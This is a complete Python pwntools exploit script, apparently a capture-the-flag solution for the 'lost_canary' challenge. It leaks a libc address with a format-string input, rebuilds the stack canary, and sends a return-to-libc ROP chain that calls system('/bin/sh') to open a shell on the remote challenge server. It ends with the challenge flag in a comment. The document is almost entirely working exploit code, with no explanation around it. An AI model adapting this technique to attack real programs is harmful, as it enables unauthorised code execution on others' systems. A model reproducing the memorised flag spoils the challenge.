#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./lost_canary_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

REMOTE_NC_CMD    = "nc lost-canary.chal.uiuc.tf 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *select_station+104
b *station_14927
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]), ssl=True)

def main():
    r = conn()

    r.sendline(b"14927%p")
    r.recvuntil(b"14927")
    libc.address = int(r.recvline(False), 16) - libc.sym._IO_2_1_stdout_ - 131
 
    log.info(f"LIBC @ {hex(libc.address)}")

    rop = ROP(libc)
    POP_RDI = p64(rop.rdi.address)
    canary = 0x7361754569205965
    chain = p64(canary)*2 + POP_RDI + p64(libc.binsh()) + p64(rop.ret.address) + p64(libc.sym.system)

    r.sendline(b"A"*4+chain)
    r.interactive()
    #uiuctf{the_average_sigpwny_transit_experience}

if __name__ == "__main__":
    main()